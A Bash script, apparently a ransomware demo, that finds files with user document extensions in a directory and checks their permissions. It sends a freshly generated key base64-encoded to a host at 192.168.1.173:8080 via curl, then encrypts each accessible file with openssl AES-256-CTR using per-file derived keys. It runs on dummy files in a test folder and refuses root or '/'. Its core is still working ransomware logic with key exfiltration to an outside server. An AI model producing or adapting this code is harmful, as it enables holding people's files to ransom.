#!/usr/bin/env bash

# Sanity check! Prevent execution as root
# This script should not be run with elevated privileges to avoid unintended 
# system annihilations.

if [[ $EUID -eq 0 ]]; then
   echo "Error: This script should not be run as root (UID 0)." >&2
   echo "Please run it as a regular user." >&2
   exit 1
fi

# Make sure file can be modified
# For each candidate file, we ensure:
# - It exists (-e)
# - It is readable (-r)
# - It is writable (-w) # Corrected typo

check_file() {
    local file_path="$1" # Use a local variable for the argument for clarity

    # Can we see its existence?
    if ! [[ -e "$file_path" ]]; then
        echo -e "\tCouldn't find $file_path."
        return 1
    fi

    # Can we see its contents?
    if ! [[ -r "$file_path" ]]; then
        echo -e "\tNo read access."
        return 1
    else
        echo -e "\tRead access."
    fi

    # Can we change its contents?
    if ! [[ -w "$file_path" ]]; then
        echo -e "\tNo write access."
        return 1
    else
        echo -e "\tWrite access."
    fi

    return 0
}


# Find user file within the specified directory
# Ensure directory exists and we can access it
# Search within accessible directories for user files
# Check file permissions with check_files()

find_files() {
    local -n ref_exposed_files="$2"
    local search_dir="$1" # Use a local variable for clarity

    # SANITY AND SAFETY CHECK! 
    # Prevent searching in the root directory and limit scope
    if [[ "$search_dir" == "/" ]]; then
        echo "Error: Searching the root directory (/) is not allowed for safety." >&2
        return 1
    fi 

    # Directory exists?
    if ! [[ -d "$search_dir" ]]; then
        echo "Can't find $search_dir." >&2 # Direct errors to stderr
        return 1
    else
        echo "Found $search_dir."
    fi

    # We have permissions?
    if ! [[ -x "$search_dir" && -r "$search_dir" ]]; then
        echo -e "\tCan't access $search_dir (permissions)" >&2 # Direct errors to stderr
        return 1
    else
        echo -e "\tWe can access directory."
    fi

    # Search in directory
    ext_regex='.*\.\(csv\|xlsx\|docx\|rtf\|pdf\|ost\|pst\|zip\|rar\|7z\|png\|txt\)$' # Corrected xlsx typo
    
    # Use an intermediate array to store files found by find
    local -a found_files=()
    # mapfile -d $'\0' reads null-delimited input into an array
    # It must be run outside a pipe for the array to persist
    # find "$search_dir" -maxdepth 1 -type f -iregex "$ext_regex" -print0
    # Note: `find . -maxdepth 1` would only search the current directory for files.
    # If the user provides `/home/shane/demo` as $search_dir, you want to find files IN that directory.
    # So `find "$search_dir" -maxdepth 1 ...` is correct for that behavior.
    mapfile -d $'\0' -t found_files < <(find "$search_dir" -maxdepth 1 -type f -iregex "$ext_regex" -print0)

    # Now iterate over the collected files
    for file in "${found_files[@]}"; do
        # Remove the leading directory if present, as find might return "./file"
        local base_file=$(basename "$file")
        echo "Found file type associated with users: $base_file. Checking permissions..."
        # Pass the full path to check_file
        if check_file "$file"; then
            ref_exposed_files+=("$(readlink -f "$file")")
            echo -e "\tAccessible. Added to list."
        else
            echo -e "\tInaccessible. Skipping"
        fi
    done
    
    return 0
}

# Generate an actual encryption from the keying material
# In a weird and questionable way
#
encrypt_file() {
    # CRITICAL FIX: Ensure you're expanding the variable, not the literal string
    local hash_input
    hash_input="$(stat -c %U:%G "$1")$(readlink -f "$1")$key" # Added quotes around $1 and $key
    
    local aes_sk
    aes_sk="$(echo -n "$hash_input" | sha256sum | tr -d ' -' )" # FIXED: "$hash_input" instead of hash_input
    
    echo -e "FILE $1\n \tSHA256($hash_input)\n \t\t=>AES KEY $aes_sk" # Added tab for formatting AES KEY line
    openssl enc -aes-256-ctr -pass pass:"$aes_sk" -iter 100 -a -in "$1" -out "$1.aes256.100" # Added quotes around $1 and $1.aes256.100
    
    # Unset these after use (secret) - Optional for local variables
    # These variables are 'local' by scope, so they vanish when the function exits.
    # Explicitly unsetting them is usually only critical for global variables or
    # if you want to zero out memory (which `unset` doesn't strictly guarantee).
    unset hash_input # Removed $, operating on the variable name
    unset aes_sk     # Removed $, operating on the variable name
}

declare -a exposed_files
key=$(openssl rand -hex 32)
echo -e "Generated 256 bits of keying material" # Corrected typo
echo -e "\t =KEY: $key"

# Using printf for more robust variable expansion in curl header
# Added quotes around the URL
curl -X POST -H "Special-Delivery: $(printf "%s" "$key" | base64)" "http://192.168.1.173:8080" 2> /dev/null

# Create a test directory and files for demonstration
mkdir -p rx_dir
touch rx_dir/account{1..12}{01,15}{24,25}.csv
touch rx_dir/hr{Apr,June,Oct}{23,25}.docx # Corrected docs to docx based on regex

# Directory is Read+Execute
# Files within are r, rw, w, and no permissions (tesT)
# Ensure the script is run from a location where rx_dir is created, or provide a full path.
# Example: find_files "$(pwd)/rx_dir" "exposed_files"
find_files "rx_dir" "exposed_files"

echo "---------ENCRYPTING---------"
echo ":"
for file in "${exposed_files[@]}"; do
    encrypt_file "$file" # Always double-quote variable expansions
done

# Added a cleanup command for the demo directory
rm -rf rx_dir
